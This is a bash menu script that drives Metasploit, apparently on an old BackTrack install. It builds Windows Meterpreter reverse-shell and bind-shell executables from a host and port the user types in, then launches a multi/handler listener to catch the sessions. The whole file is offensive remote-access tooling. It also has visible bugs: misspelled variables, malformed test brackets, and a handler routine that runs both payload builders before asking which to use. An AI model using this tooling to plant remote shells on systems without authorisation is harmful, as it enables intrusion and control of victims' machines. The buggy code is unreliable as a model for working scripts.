#!/bin/bash




COLORIZING()
{
# Text color variables
txtund=$(tput sgr 0 1)    # Underline
txtbld=$(tput bold)       # Bold
txtred=$(tput setaf 1)    # Red
txtgrn=$(tput setaf 2)    # Green
txtylw=$(tput setaf 3)    # Yellow
txtblu=$(tput setaf 4)    # Blue
txtpur=$(tput setaf 5)    # Purple
txtcyn=$(tput setaf 6)    # Cyan
txtwht=$(tput setaf 7)    # White
txtrst=$(tput sgr0)       # Text reset

# Colored Texts 
# echo -e $(tput sgr0) # Reset All Colors
# echo -e $(tput setaf 6)$(tput bold) $LNAME ; echo -e $(tput sgr0)
# echo -e $(tput setaf 6)$(tput bold) $RNAME ; echo -e $(tput sgr0)
OO="[!]"
YY="[+]"
echo -e $(tput setaf 1)$(tput bold) $OO $(tput sgr0)
echo -e $(tput setaf 3)$(tput bold) $YY $(tput sgr0)
}

cd /pentest/exploits/framework3

# Variable Section
CHOICES="1 2 3 4"

# Function Section
function menu {
  clear
  echo " "
  echo " "
  echo " "
  echo "#################### Quick Metasploit #####################"
  echo "###            What would you like to do ?              ###"
  echo "###    1) Create a Reverse Shell Meterpreter Payload    ###"
  echo "###    2) Create a Bind    Shell Meterpreter Payload    ###"
  echo "###    3) Run Multi Handler (Reverse/Bind)              ###"
  echo "###    4) Exit This Script                              ###"
  echo "###########################################################"
  echo " "
  echo " "
}


REVERSE()
{
COLORIZING
read -p "$ Please Enter Local Port: " LPORT
read -p "[+] Please Enter Local Host: " LHOST
read -p "[+] Please Enter File  Name: " LNAME

REVPAYLOAD='msfpayload windows/meterpreter/reverse_tcp'
./$REVPAYLOAD LHOST=$LHOST LPORT=$LPORT  X > $LNAME  > /dev/null 2>&1

echo "[!]$(tput setaf 6)$(tput bold) $LNAME $(tput sgr0) file has been created "
sleep 2
}


BIND()
{
COLORIZING
read -p "[+] Please Enter Remote Port: " RPORT
read -p "[+] Please Enter Remote Host: " RHOST
read -p "[+] Please Enter File   Name: " RNAME

DINDPAYLOAD='msfpayload windows/meterpreter/bind_tcp'
./$DINDPAYLOAD RHOST=$RHOST RPORT=$RPORT  X > $RNAME  > /dev/null 2>&1

echo "[!]$(tput setaf 6)$(tput bold) $RNAM $(tput sgr0) file has been created "
sleep 2
}


HANDLER()
{
COLORIZING
REVERSE
BIND

read -p "[!] Chose Your Handler(Reverse/Bind): [r/b]: " TYPE

if [[$TYPE == r]]
  then 
      ./msfcli multi/handler $REVPAYLOAD
elif [[$TYPE == b]]
  then
      ./msfcli multi/handler $BINDPAYLOAD

else 
echo "[!] Please Answer by [r/b] character Only.." 
read -p "[!] Chose Your Handler(Reverse/Bind): [r/b]: " TYPE

    if [[$TYPE == r]]
      then 
	  ./msfcli multi/handler $REVPAYLOAD
    elif [[$TYPE == b]]
      then
	  ./msfcli multi/handler $BINDPAYLOAD
    fi
sleep 2
fi

}



#-->  Main Script Section 
clear
    
    menu    
select choix in $CHOICES; do                    
    if [ "$choix" = "1" ]; then
    REVERSE                 
    menu

    elif [ "$choix" = "2" ]; then
    BIND
    menu

    elif [ "$choix" = "3" ]; then
    HANDLER
    menu

    elif [ "$choix" = "4" ]; then
        clear
    echo " "
    echo "--------------------------------------"
    echo " Script Terminated Good Bye $(logname)"
    echo "--------------------------------------"
        exit        
    else
    clear
    menu
    echo " "
    echo " "        
    clear
    echo " "
    echo " "        
    echo " "        
    echo " "        
    echo "################################################################"
    echo "###         Wrong Number Please Try again    !!!             ###"
    echo "################################################################"
        sleep 2
    clear
    menu
    fi
done





